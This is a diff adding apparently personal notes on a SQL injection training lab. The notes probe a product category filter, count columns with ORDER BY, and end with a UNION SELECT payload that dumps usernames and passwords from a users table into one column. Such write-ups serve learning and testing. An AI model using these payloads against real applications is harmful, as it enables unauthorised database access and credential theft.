@@ -1,0 +1,31 @@
+LAB 06: UNION ATTACK RETRIEVING THE MULTIPLE VALUES IN A SINGLE COLUMN
+
+VULNERABLE CATEGORY: Product category filter
+
+ANALYSIS: 
+1. Using single quote (') to break the page.
+ *** so it's giving me a Internal Server error so there might be possible of sqli
+
+2. Now, I am commenting(--) to see the page will shown or not 
+*** filter?category=Pets'-- 
+*** The page is showing completey fine so 100% there should be a sql injection
+
+3. Now lets examine the number of column present in that databases
+ *** For that I will be using at first ' ORDER BY 1(will have to increment 1 to see the result)
+ *** ' ORDER BY 1-- (The page is showing fine so there is more then one column)
+ *** ' ORDER BY 2-- (The page is also showing fine so there might be more then two column)
+ *** ' ORDER BY 3-- (It does shows me a error so) the total column present in my database is: 3-1=2
+
+ 4. Now lets what type of data holdes in column 2 because column 1 is in the backend but doesnot shows in frontend 
+ *** For that I will be using queries like: 
+    ****' UNION SELECT NULL,'a'--
+    **** If a does shows in the column 2 then there is string type of data in the column 2
+
+5. Now getting the data username and password from the single column"
+*** ' UNION SELECT username,password FROM users-- ==> this does shows me an error because our main goal is to retrieving from the single column here two column are being used.
+*** ' UNION SELECT NULL(selecting nothing from column1),username || ' = ' || password FROM users-- ==> this does shows the username and password on single column that is column2.
+*** THE actual payload is"==> ' UNION SELECT NULL,username || ' = ' || password FROM users--
+*** This does shows me the username and password so the lab does complete.
+
+NOW, we will be exploiting it.
+    
